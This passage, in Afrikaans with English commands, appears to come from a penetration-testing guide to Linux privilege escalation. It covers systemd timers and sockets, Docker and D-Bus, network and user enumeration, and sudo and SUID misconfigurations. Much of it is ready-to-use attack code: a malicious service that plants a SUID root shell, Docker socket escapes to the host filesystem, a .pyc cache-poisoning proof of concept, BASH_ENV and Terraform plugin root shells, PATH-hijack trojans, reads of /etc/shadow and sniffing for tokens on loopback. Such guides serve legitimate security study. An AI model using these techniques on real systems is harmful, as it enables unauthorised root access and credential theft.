> Die Unit wat geaktiveer moet word wanneer hierdie timer verstryk. Die argument is ’n Unit-naam waarvan die agtervoegsel nie ".timer" is nie. Indien dit nie gespesifiseer word nie, kry hierdie waarde by verstek die naam van ’n service wat dieselfde naam as die timer Unit het, behalwe vir die agtervoegsel. (Sien hierbo.) Dit word aanbeveel dat die Unit-naam wat geaktiveer word en die Unit-naam van die timer Unit identies benoem word, behalwe vir die agtervoegsel.

Daarom sal jy die volgende moet doen om hierdie permission te misbruik:

- Vind ’n systemd Unit (soos ’n `.service`) wat ’n **writable binary uitvoer**
- Vind ’n systemd Unit wat ’n **relative path uitvoer** en jy het **writable privileges** oor die **systemd PATH** (om daardie executable na te boots)

**Kom meer te wete oor timers met `man systemd.timer`.**

### **Aktivering van Timer**

Om ’n timer te aktiveer, het jy root privileges nodig en moet jy die volgende uitvoer:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Let daarop dat die **timer** **geaktiveer** word deur ’n simlink daarna te skep by `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) maak **proseskommunikasie** op dieselfde of verskillende masjiene binne client-server-modelle moontlik. Hulle gebruik standaard Unix-deskriptorlêers vir interrekenaarkommunikasie en word deur middel van `.socket`-lêers opgestel.<sup>[[14]](#references)</sup>

Sockets kan met `.socket`-lêers gekonfigureer word.

**Leer meer oor sockets met `man systemd.socket`.** Binne hierdie lêer kan verskeie interessante parameters gekonfigureer word:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Hierdie opsies verskil, maar ’n opsomming word gebruik om **aan te dui waar dit na die socket gaan luister** (die pad van die AF_UNIX-socketlêer, die IPv4/6- en/of poortnommer waarna geluister moet word, ens.)
- `Accept`: Neem ’n boolean-argument. Indien **true**, word ’n **service instance vir elke inkomende verbinding geskep** en slegs die verbindingsocket word daaraan deurgegee. Indien **false**, word al die luisterende sockets self aan die **started service unit** deurgegee, en slegs een service unit word vir alle verbindings geskep. Hierdie waarde word vir datagramsockets en FIFOs geïgnoreer, waar ’n enkele service unit onvoorwaardelik alle inkomende verkeer hanteer. **Die verstekwaarde is false**. Om prestasieredes word dit aanbeveel om nuwe daemons slegs te skryf op ’n manier wat geskik is vir `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Neem een of meer command lines wat onderskeidelik **voor** of **ná** die luisterende **sockets**/FIFOs **geskep** en gebind is, uitgevoer word. Die eerste token van die command line moet ’n absolute lêernaam wees, gevolg deur argumente vir die proses.
- `ExecStopPre`, `ExecStopPost`: Bykomende **commands** wat onderskeidelik **voor** of **ná** die luisterende **sockets**/FIFOs **gesluit** en verwyder is, uitgevoer word.
- `Service`: Spesifiseer die naam van die **service** unit **wat geaktiveer moet word** wanneer daar **inkomende verkeer** is. Hierdie instelling word slegs toegelaat vir sockets met Accept=no. Dit gebruik by verstek die service met dieselfde naam as die socket (met die suffix vervang). In die meeste gevalle behoort dit nie nodig te wees om hierdie opsie te gebruik nie.

### Skryfbare .socket-lêers

Indien jy ’n **skryfbare** `.socket`-lêer vind, kan jy iets soos `ExecStartPre=/home/kali/sys/backdoor` aan die begin van die `[Socket]`-afdeling **byvoeg**, waarna die backdoor uitgevoer sal word voordat die socket geskep word. Daarom sal jy **waarskynlik moet wag totdat die masjien herlaai word.**\
_Neem kennis dat die stelsel daardie socket-lêerkonfigurasie moet gebruik, anders sal die backdoor nie uitgevoer word nie_

### Socket activation + skryfbare unit-pad (skep ontbrekende service)

Nog ’n hoërisiko-miskonfigurasie is:

- ’n socket unit met `Accept=no` en `Service=<name>.service`
- die verwysde service unit ontbreek
- ’n aanvaller kan na `/etc/systemd/system` (of ’n ander unit-soekpad) skryf

In daardie geval kan die aanvaller `<name>.service` skep en dan verkeer na die socket stuur sodat systemd die nuwe service as root laai en uitvoer.

Vinnige vloei:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Skryfbare sockets

As jy **enige skryfbare socket identifiseer** (_nou praat ons van Unix Sockets en nie van die config `.socket`-lêers nie_), **kan jy met daardie socket kommunikeer** en moontlik ’n vulnerability uitbuit.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Rou verbinding
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Uitbuitingsvoorbeeld:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

Let daarop dat daar moontlik **sockets is wat vir HTTP**-versoeke luister (_Ek praat nie van .socket-lêers nie, maar van die lêers wat as unix-sockets optree_). Jy kan dit hiermee nagaan:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
As die socket met ’n **HTTP**-request **reageer**, kan jy daarmee **kommunikeer** en moontlik **’n kwesbaarheid uitbuit**.

### Skryfbare Docker Socket

Die Docker-socket, wat dikwels by `/var/run/docker.sock` gevind word, is ’n kritieke lêer wat beveilig moet word. By verstek is dit skryfbaar deur die `root`-gebruiker en lede van die `docker`-groep. Toegang met skryftoestemming tot hierdie socket kan tot privilege escalation lei. Hier is ’n uiteensetting van hoe dit gedoen kan word, asook alternatiewe metodes indien die Docker CLI nie beskikbaar is nie.

#### **Privilege Escalation met Docker CLI**

As jy skryftoegang tot die Docker-socket het, kan jy privilege escalation uitvoer deur die volgende commands te gebruik:<sup>[[15]](#references)</sup>
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Hierdie opdragte laat jou toe om ’n container met root-vlaktoegang tot die host se lêerstelsel te laat loop.

#### **Gebruik Docker API direk**

In gevalle waar die Docker CLI nie beskikbaar is nie, kan die Docker-socket steeds misbruik word deur rou HTTP oor die Unix-socket te gebruik. Die mees betroubare vloei is:

- skep ’n helper-container wat lank loop, met die host se root-gids as ’n bind mount
- begin dit
- skep ’n `exec`-instansie binne daardie helper
- begin die `exec`-instansie en lees die uitvoer terug deur die API

**Lys Docker images**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
**Skep en begin ’n helper-container**
```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
"http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
-X POST "http://localhost/v1.47/containers/${HELPER}/start"
```
Skep ’n exec-instansie
```bash
EXEC_ID=$(
curl -s --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
"http://localhost/v1.47/containers/${HELPER}/exec" \
| tr -d '\n' \
| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```
**Begin die exec-instansie en lees die uitvoer**
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":true}' \
"http://localhost/v1.47/exec/${EXEC_ID}/start"
```
Hierdie patroon is gewoonlik meer robuust as om `attach` handmatig met `socat` of `nc -U` te probeer beheer. Sodra jy ’n helper met `/:/host` kan skep, kan jy bykomende `exec`-instansies gebruik om lêers soos `/host/root/...` te lees, SSH-sleutels onder `/host/root/.ssh` by te voeg, of host-opstartlêers te wysig.

### Ander

Let daarop dat indien jy skryftoestemmings oor die docker-socket het omdat jy **binne die groep `docker`** is, jy [**meer maniere het om privileges te eskaleer**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Indien die [**docker API op ’n poort luister** kan jy dit ook kompromitteer](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Kyk na **meer maniere om uit containers te ontsnap of container runtimes te misbruik om privileges te eskaleer** by:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Indien jy vind dat jy die **`ctr`**-opdrag kan gebruik, lees die volgende bladsy, aangesien jy dit moontlik kan misbruik om privileges te eskaleer:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Indien jy vind dat jy die **`runc`**-opdrag kan gebruik, lees die volgende bladsy, aangesien jy dit moontlik kan misbruik om privileges te eskaleer:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus is ’n gesofistikeerde **inter-Process Communication (IPC)-stelsel** wat toepassings in staat stel om doeltreffend met mekaar te kommunikeer en data te deel. Dit is ontwerp met die moderne Linux-stelsel in gedagte en bied ’n robuuste raamwerk vir verskillende vorme van toepassingkommunikasie.<sup>[[16]](#references)</sup>

Die stelsel is veelsydig en ondersteun basiese IPC wat data-uitruiling tussen prosesse verbeter, soortgelyk aan **verbeterde UNIX-domeinsokette**. Dit help ook met die uitsaai van gebeurtenisse of seine, wat naatlose integrasie tussen stelselkomponente bevorder. Byvoorbeeld, ’n sein van ’n Bluetooth-daemon oor ’n inkomende oproep kan ’n musiekspeler aanspoor om die klank te demp, wat die gebruikerservaring verbeter. Daarbenewens ondersteun D-Bus ’n afgeleë objekstelsel wat diensversoeke en metode-aanroepe tussen toepassings vereenvoudig, en prosesse stroomlyn wat tradisioneel kompleks was.

D-Bus werk volgens ’n **allow/deny-model** en bestuur boodskaptoestemmings (metode-aanroepe, seinvrystellings, ens.) gebaseer op die kumulatiewe effek van ooreenstemmende beleidsreëls. Hierdie beleide spesifiseer interaksies met die bus en kan moontlik privilege escalation toelaat deur die uitbuiting van hierdie toestemmings.

’n Voorbeeld van so ’n beleid in `/etc/dbus-1/system.d/wpa_supplicant.conf` word verskaf. Dit beskryf toestemmings vir die root-gebruiker om boodskappe van `fi.w1.wpa_supplicant1` te besit, daarheen te stuur en daarvan te ontvang.

Beleide sonder ’n gespesifiseerde gebruiker of groep is universeel van toepassing, terwyl beleide in die "default"-konteks van toepassing is op alles wat nie deur ander spesifieke beleide gedek word nie.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Leer hier hoe om 'n D-Bus-kommunikasie te enumerate en te exploit:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netwerk**

Dit is altyd interessant om die netwerk te enumerate en die masjien se posisie uit te werk.

### Algemene enumerasie
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Vinnige triage van uitgaande filtering

As die host opdragte kan uitvoer, maar callbacks misluk, onderskei vinnig tussen DNS-, transport-, proxy- en roetefiltering:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Oop poorte

Kontroleer altyd netwerkdienste wat op die masjien loop waarmee jy nie kon interaksie hê voordat jy toegang daartoe verkry het nie:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Klassifiseer listeners volgens bind-teiken:

- `0.0.0.0` / `[::]`: blootgestel op alle plaaslike interfaces.
- `127.0.0.1` / `::1`: slegs plaaslik (goeie tunnel/forward-kandidate).
- Spesifieke interne IP's (bv. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): gewoonlik slegs vanaf interne segmente bereikbaar.

### Plaaslike diens-triage-werksvloei

Wanneer jy 'n host kompromitteer, word services wat aan `127.0.0.1` gebind is, dikwels vir die eerste keer vanaf jou shell bereikbaar. 'n Vinnige plaaslike werksvloei is:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS as 'n netwerkskandeerder (slegs-netwerkmodus)

Benewens plaaslike PE-kontroles kan linPEAS as 'n gefokusde netwerkskandeerder werk. Dit gebruik beskikbare binaries in `$PATH` (tipies `fping`, `ping`, `nc`, `ncat`) en installeer geen tools nie.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
As jy `-d`, `-p` of `-i` sonder `-t` gebruik, tree linPEAS op as 'n suiwer network scanner (en slaan die res van die privilege-escalation checks oor).

### Sniffing

Kontroleer of jy traffic kan sniff. As jy kan, kan jy moontlik credentials onderskep.
```
timeout 1 tcpdump
```
Vinnige praktiese kontroles:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) is veral waardevol in post-exploitation omdat baie slegs-interne dienste tokens/cookies/credentials daar blootstel:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Versamel nou, ontleed later:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Gebruikers

### Algemene enumerasie

Kontroleer **wie** jy is, watter **voorregte** jy het, watter **gebruikers** in die stelsels is, watter van hulle kan **login** en watter een **root-voorregte** het:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Groot UID

Sommige Linux-weergawes is deur ’n fout geraak wat gebruikers met **UID > INT_MAX** toelaat om privileges te eskaleer. Meer inligting: [hier](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hier](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) en [hier](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Ontgin dit** met: **`systemd-run -t /bin/bash`**

### Groepe

Kontroleer of jy ’n **lid van ’n groep** is wat jou root privileges kan gee:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Knipbord

Kontroleer of enigiets interessant binne die knipbord geleë is (indien moontlik)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Wagwoordbeleid
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekende wagwoorde

As jy **enige wagwoord van die omgewing ken**, probeer om met die wagwoord as elke gebruiker aan te meld.

### Su Brute

As jy nie omgee om baie geraas te maak nie en die `su`- en `timeout`-binêre lêers op die rekenaar teenwoordig is, kan jy probeer om 'n gebruiker met [su-bruteforce](https://github.com/carlospolop/su-bruteforce) te brute-force.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) met die `-a`-parameter probeer ook om gebruikers te brute-force.

## Misbruik van skryfbare PATH

### $PATH

As jy vind dat jy **in 'n vouer van die $PATH kan skryf**, kan jy moontlik voorregte eskaleer deur **'n backdoor in die skryfbare vouer te skep** met die naam van 'n opdrag wat deur 'n ander gebruiker (verkieslik root) uitgevoer gaan word en wat **nie gelaai word vanaf 'n vouer wat vroeër as jou skryfbare vouer in $PATH geleë is nie**.

### SUDO en SUID

Jy kan toegelaat word om sekere opdragte met sudo uit te voer, of hulle kan die SUID-bit hê. Kontroleer dit met:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Sommige **onverwagte opdragte laat jou toe om lêers te lees en/of te skryf, of selfs ’n opdrag uit te voer**.<sup>[[8]](#references)</sup> Byvoorbeeld:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo-konfigurasie kan 'n gebruiker toelaat om sekere opdragte met 'n ander gebruiker se voorregte uit te voer sonder om die wagwoord te ken.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In hierdie voorbeeld kan die gebruiker `demo` `vim` as `root` uitvoer; dit is nou eenvoudig om 'n shell te kry deur 'n ssh key by die root-gids te voeg of deur `sh` aan te roep.
```
sudo vim -c '!sh'
```
### SETENV

Hierdie directive laat die gebruiker toe om ’n **environment variable** te **set** terwyl iets uitgevoer word:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Hierdie voorbeeld, **gebaseer op HTB machine Admirer**, was **kwesbaar** vir **PYTHONPATH hijacking** om 'n arbitrêre python library te laai terwyl die script as root uitgevoer word:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Writable `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports

As ’n **sudo-allowed Python script** ’n module invoer waarvan die pakketgids ’n **skryfbare `__pycache__`** bevat, kan jy moontlik die gekasde `.pyc` vervang en kode-uitvoering as die bevoorregte gebruiker verkry wanneer dit weer ingevoer word.<sup>[[30]](#references)</sup>

- Waarom dit werk:
- CPython stoor bytecode caches in `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
- Die interpreter valideer die **header** (magic + timestamp/hash-metadata wat aan die bron gekoppel is), en voer dan die gemarshal-de code object uit wat ná daardie header gestoor is.
- As jy die gekasde lêer kan **delete and recreate** omdat die gids skryfbaar is, kan ’n root-owned maar nie-skryfbare `.pyc` steeds vervang word.
- Tipiese pad:
- `sudo -l` wys ’n Python-script of wrapper wat jy as root kan uitvoer.
- Daardie script voer ’n plaaslike module in vanaf `/opt/app/`, `/usr/local/lib/...`, ens.
- Die ingevoerde module se `__pycache__`-gids is skryfbaar deur jou gebruiker of deur almal.

Vinnige enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
As jy die script met verhoogde voorregte kan inspekteer, identifiseer die ingevoerde modules en hul kaspad:<sup>[[32]](#references)</sup>
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Misbruik-werkvloei:

1. Voer die sudo-allowed script een keer uit sodat Python die legit cache file skep indien dit nog nie bestaan nie.
2. Lees die eerste 16 bytes uit die legit `.pyc` en gebruik dit weer in die poisoned file.
3. Compileer ’n payload code object, `marshal.dumps(...)` dit, vee die oorspronklike cache file uit, en skep dit weer met die oorspronklike header plus jou malicious bytecode.
4. Voer die sudo-allowed script weer uit sodat die import jou payload as root uitvoer.

Belangrike notas:

- Die hergebruik van die oorspronklike header is belangrik omdat Python die cache metadata teen die source file kontroleer, nie of die bytecode body werklik met die source ooreenstem nie.
- Dit is veral nuttig wanneer die source file deur root besit word en nie skryfbaar is nie, maar die bevattende `__pycache__`-directory wel skryfbaar is.
- Die aanval misluk indien die privileged process `PYTHONDONTWRITEBYTECODE=1` gebruik, vanaf ’n location met veilige permissions importeer, of write access tot elke directory in die import path verwyder.

Minimale proof-of-concept-vorm:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Maak seker dat geen gids in die bevoorregte Python-importpad deur gebruikers met lae voorregte skryfbaar is nie, insluitend `__pycache__`.
- Oorweeg vir bevoorregte uitvoerings `PYTHONDONTWRITEBYTECODE=1` en periodieke kontroles vir onverwagte skryfbare `__pycache__`-gidse.
- Behandel skryfbare plaaslike Python-modules en skryfbare kasgidse op dieselfde manier as skryfbare shell scripts of gedeelde biblioteke wat deur root uitgevoer word.

### BASH_ENV preserved via sudo env_keep → root shell

As sudoers `BASH_ENV` behou (byvoorbeeld `Defaults env_keep+="ENV BASH_ENV"`), kan jy Bash se nie-interaktiewe opstartgedrag benut om arbitrêre kode as root uit te voer wanneer jy ’n toegelate opdrag aanroep.<sup>[[24]](#references)</sup>

- Waarom dit werk: Vir nie-interaktiewe shells evalueer Bash `$BASH_ENV` en sourceer daardie lêer voordat die teikenskrip uitgevoer word. Baie sudo-reëls laat toe dat ’n skrip of ’n shell-wrapper uitgevoer word. As `BASH_ENV` deur sudo behou word, word jou lêer met root-voorregte gesource.<sup>[[23]](#references)</sup>

- Vereistes:
- ’n Sudo-reël wat jy kan uitvoer (enige teiken wat `/bin/bash` nie-interaktief aanroep, of enige bash-skrip).
- `BASH_ENV` teenwoordig in `env_keep` (kontroleer met `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Verharding:
- Verwyder `BASH_ENV` (en `ENV`) uit `env_keep`; verkies `env_reset`.
- Vermy shell wrappers vir sudo-toegelate commands; gebruik minimale binaries.
- Oorweeg sudo I/O-logging en waarskuwings wanneer behoue omgewingsveranderlikes gebruik word.

### Terraform via sudo met behoue HOME (!env_reset)

As sudo die omgewing ongeskonde laat (`!env_reset`) terwyl dit `terraform apply` toelaat, bly `$HOME` dié van die gebruiker wat die command uitvoer. Terraform laai dus **$HOME/.terraformrc** as root en respekteer `provider_installation.dev_overrides`.<sup>[[25]](#references)</sup>

- Wys die vereiste provider na ’n skryfbare gids en plaas ’n kwaadwillige plugin met die naam van die provider (byvoorbeeld `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform sal die Go plugin-handshake misluk, maar voer die payload as root uit voordat dit beëindig, en laat ’n SUID-shell agter.

### TF_VAR overrides + symlink validation bypass

Terraform-veranderlikes kan via `TF_VAR_<name>`-environment-veranderlikes verskaf word, wat behoue bly wanneer sudo die environment behou. Swak validasies soos `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` kan met simboliese skakels omseil word:<sup>[[25]](#references)</sup>
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform volg die symlink en kopieer die werklike `/root/root.txt` na ’n bestemming wat deur die aanvaller gelees kan word. Dieselfde benadering kan gebruik word om na bevoorregte paaie te **skryf** deur vooraf destination-symlinks te skep (byvoorbeeld deur die provider se destination path binne `/etc/cron.d/` te laat wys).

### requiretty / !requiretty

Op sommige ouer distribusies kan sudo met `requiretty` gekonfigureer word, wat sudo dwing om slegs vanaf ’n interaktiewe TTY uitgevoer te word. As `!requiretty` gestel is (of die opsie afwesig is), kan sudo vanuit nie-interaktiewe kontekste, soos reverse shells, cron jobs of scripts, uitgevoer word.
```bash
Defaults !requiretty
```
Dit is nie op sigself ’n direkte kwesbaarheid nie, maar dit brei die situasies uit waarin sudo-reëls misbruik kan word sonder dat ’n volledige PTY benodig word.

### Sudo env_keep+=PATH / onveilige secure_path → PATH hijack

As `sudo -l` `env_keep+=PATH` wys, of as `secure_path` inskrywings bevat waartoe ’n aanvaller kan skryf (bv. `/home/<user>/bin`), kan enige relatiewe command binne die sudo-toegelate teiken oorskadu word.<sup>[[3]](#references)</sup>

- Vereistes: ’n sudo-reël (dikwels `NOPASSWD`) wat ’n script/binary uitvoer wat commands sonder absolute paths aanroep (`free`, `df`, `ps`, ens.) en ’n skryfbare PATH-inskrywing wat eerste gesoek word.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo-uitvoering wat paaie omseil
**Spring** om ander lêers te lees of **symlinks** te gebruik. Byvoorbeeld in die sudoers-lêer: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
As 'n **wildcard** gebruik word (\*), is dit selfs makliker:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Teenmaatreëls**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary sonder command path

As die **sudo permission** aan ’n enkele command gegee word **sonder om die path te spesifiseer**: _hacker10 ALL= (root) less_, kan jy dit uitbuit deur die PATH-variable te verander
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Hierdie tegniek kan ook gebruik word indien ’n **suid** binary **nog ’n command uitvoer sonder om die path daarna te spesifiseer (check altyd met** _**strings**_ **die inhoud van ’n vreemde SUID binary)**.

[Payload examples to execute.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID binary met command path

